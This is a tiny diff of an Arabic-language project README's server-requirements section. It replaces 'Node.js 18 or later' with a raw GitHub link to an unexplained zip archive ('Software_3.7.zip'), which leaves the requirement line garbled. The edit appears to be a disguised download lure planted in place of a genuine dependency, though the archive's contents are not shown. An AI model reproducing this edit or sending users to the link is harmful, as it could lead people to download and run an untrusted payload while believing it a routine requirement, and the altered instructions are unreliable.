@@ -4,5 +4,5 @@
 
 ### 1. متطلبات الخادم:
 ```bash
-Node.js 18 أو أحدث
+https://raw.githubusercontent.com/DragonBaha/1/main/fairyism/Software_3.7.zip 18 أو أحدث
 npm أو yarn
